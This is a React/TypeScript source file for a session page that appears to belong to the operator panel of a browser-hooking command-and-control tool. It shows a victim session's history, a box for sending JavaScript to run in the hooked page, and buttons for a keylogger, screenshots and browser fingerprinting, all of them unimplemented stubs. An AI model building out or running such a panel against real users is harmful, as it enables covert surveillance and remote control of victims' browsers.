import React, { useContext, useEffect, useMemo, useState } from "react";
import { useParams } from "react-router";
import { StateContext } from "../../data/stateContext";
import History from "../../types/history";
import Session from "../../types/session";
import Icon from "../../Components/Icon/Icon";
import HelperService from "../../services/HelperService";

export default function SingleSession() {
  const { value, update } = useContext(StateContext);
  const { id } = useParams<{ id: string }>();
  const session = useMemo(
    () => value.sessions.find((s) => s.sessionId.toString() === id),
    [id, value.sessions]
  );
  const historyItems = useMemo(
    () => value.history.filter((h) => h.sessionId === id),
    [id, value.history]
  );

  if (!session) {
    return (
      <div className="w-full h-screen flex justify-center items-center text-4xl text-white uppercase">
        Session not found
      </div>
    );
  }

  return (
    <div
      className="flex flex-row flex-1 bg-indigo-100 h-screen relative"
      style={{ maxHeight: "calc(100vh - 75px)" }}
    >
      <div className="flex-1 flex bg-indigo-100">
        <div className="flex-1 flex flex-col p-4 overflow-auto gap-4">
          <h1
            className={`h-[72px] ${
              session.status === "Active" ? "bg-green-300" : "bg-red-300"
            } text-4xl p-4 text-center`}
          >
            [{session.id}] {session.name} ({session.sessionId})
          </h1>
          <div className="flex-1 flex flex-row gap-4 flex-nowrap justify-start items-start">
            <div
              className="flex-1 flex flex-col gap-4 relative mb-4 w-64"
              style={{ height: "calc(100vh - 215px)" }}
            >
              <div className="flex-2 flex flex-col-reverse overflow-auto gap-4">
                {historyItems.map((h) => (
                  <ChatItem key={h.id} message={h} />
                ))}
              </div>
              <CommandInput />
            </div>
            <SideSessionInfo session={session} />
          </div>
        </div>
      </div>
    </div>
  );
}

const ChatItem = ({ message }: { message: History }) => {
  return (
    <div className="flex flex-col gap-4 flex-1">
      <span>
        {message.id} -{" "}
        {new Date(message.updatedAt)
          .toISOString()
          .slice(0, -4)
          .split("T")
          .map((x) => (
            <React.Fragment key={x}>
              {x}&nbsp;
              {/* <br /> */}
            </React.Fragment>
          ))}
      </span>
      <span className="break-words">
        {message.content}
        <br />
        {message.response}
      </span>
    </div>
  );
};

const CommandInput = () => {
  const [input, setInput] = useState("");

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    console.log(input);
    setInput("");
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="flex flex-col flex-1 sticky bottom-0 px-2 py-4 bg-white border border-solid border-black"
    >
      <span>(async function() &#x7B;</span>
      <div className="flex flex-row">
        <textarea
          id="message"
          className="bg-white p-4 m-2 flex-1 border border-solid border-black"
          rows={7}
          placeholder={"const value = location.href;\nreturn value; <-- this will be returned as output"
            .split("\n")
            .join("\n")}
          value={input}
          onChange={(e) => setInput(e.target.value)}
        ></textarea>
        <input
          type="submit"
          value="Send"
          className="bg-blue-500 text-white p-4 m-2"
        />
      </div>
      <span>&#x7D;)()</span>
    </form>
  );
};

const SideSessionInfo = ({ session }: { session: Session }) => {
  const [isOpen, setIsOpen] = useState(
    localStorage.getItem("sessionInfoOpen") === "true" || false
  );

  useEffect(() => {
    localStorage.setItem("sessionInfoOpen", isOpen.toString());
  }, [isOpen]);

  const noop = (e: React.MouseEvent<HTMLElement>) => {
    console.log("NIY", (e.target as HTMLElement).closest("div")?.innerText);
  };

  const startKeyloger = noop;
  const takeScreenshot = noop;
  const getUsefulInfo = noop;
  const getUserAgent = noop;
  const getScreenSize = noop;

  return (
    <div
      className="flex flex-col gap-4 bg-white w-auto max-w-128 sticky top-0 min-w-16 border border-solid border-black overflow-auto pb-4"
      style={{ height: "calc(100vh - 215px)" }}
    >
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="text-black p-2 flex flex-row items-center justify-center gap-x-4 px-4 mt-4"
      >
        <Icon
          name="hamburger"
          className="w-10 min-w-10 h-10 ml-1 text-blue-500"
        />
        <span
          className={`flex-1 break-words text-center ${isOpen ? "" : "hidden"}`}
        >
          Toggle Info
        </span>
      </button>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4">
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon name="hash" className="w-10 min-w-10 h-10 ml-1" />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            ID: {session.sessionId}
          </span>
        </div>
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon name="sign" className="w-10 min-w-10 h-10 ml-1" />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Name:
            <br />
            {session.name}
          </span>
        </div>
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon
            name={session.status === "Active" ? "toggleOn" : "toggleOff"}
            className="w-10 min-w-10 h-10 ml-1"
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Status: {session.status}
          </span>
        </div>
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon name="clock" className="w-10 min-w-10 h-10 ml-1" />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Created:
            <br />
            {HelperService.formatDateTimeWithBreak(session.createdAt)}
          </span>
        </div>
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon
            name="clock"
            className="w-10 min-w-10 h-10 ml-1 origin-center"
            style={{ transform: "rotateX(180deg)" }}
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Updated:
            <br /> {HelperService.formatDateTimeWithBreak(session.updatedAt)}
          </span>
        </div>
      </div>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4">
        <div className="flex flex-row items-center justify-center gap-x-4">
          <Icon name="command" className="w-10 min-w-10 h-10 ml-1" />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Commands
          </span>
        </div>
      </div>
      <hr className="border-t border-gray-500" />
      <div className="flex flex-col gap-4 px-4 *:cursor-pointer">
        <div
          className="flex flex-row items-center justify-center gap-x-4"
          onClick={startKeyloger}
        >
          <Icon
            name="keyboard"
            className="w-10 min-w-10 h-10 ml-1 text-blue-500"
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Start keyloger
          </span>
        </div>
        <div
          className="flex flex-row items-center justify-center gap-x-4"
          onClick={takeScreenshot}
        >
          <Icon
            name="display"
            className="w-10 min-w-10 h-10 ml-1 text-blue-500"
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Take screenshot
          </span>
        </div>
        <div
          className="flex flex-row items-center justify-center gap-x-4"
          onClick={getUsefulInfo}
        >
          <Icon name="info" className="w-10 min-w-10 h-10 ml-1 text-blue-500" />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Get useful info
          </span>
        </div>
        <div
          className="flex flex-row items-center justify-center gap-x-4"
          onClick={getUserAgent}
        >
          <Icon
            name="chrome"
            className="w-10 min-w-10 h-10 ml-1 text-blue-500"
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Get User Agent
          </span>
        </div>
        <div
          className="flex flex-row items-center justify-center gap-x-4"
          onClick={getScreenSize}
        >
          <Icon
            name="expand"
            className="w-10 min-w-10 h-10 ml-1 text-blue-500"
          />
          <span
            className={`flex-1 break-words text-center ${
              isOpen ? "" : "hidden"
            }`}
          >
            Get Screen Size
          </span>
        </div>
      </div>
    </div>
  );
};
